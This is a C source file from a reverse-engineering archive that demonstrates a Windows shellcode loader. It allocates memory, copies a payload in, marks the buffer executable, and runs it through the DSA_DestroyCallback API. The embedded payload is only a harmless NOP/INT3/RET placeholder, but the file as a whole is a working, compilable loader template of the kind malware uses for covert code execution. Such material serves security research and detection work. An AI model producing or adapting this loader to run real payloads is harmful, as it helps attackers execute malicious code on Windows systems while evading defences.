/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  DSA_DestroyCallback
*/

#include <windows.h>
#include <dpa_dsa.h>
#include <stdint.h>

#pragma comment(lib,"comctl32")

// dummy structure to be inserted
struct dummy_t { uint32_t field1; uint32_t field2; };

int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HDSA    dsa;
    dummy_t item;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // create DSA (Dynamic Pointer Array)
        dsa = DSA_Create (sizeof(dummy_t), 16);

        // insert any pointer as new item
        DSA_InsertItem (dsa, DSA_APPEND, &item);

        // trigger
        DSA_DestroyCallback (dsa, (PFNDAENUMCALLBACK)runtime, NULL);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}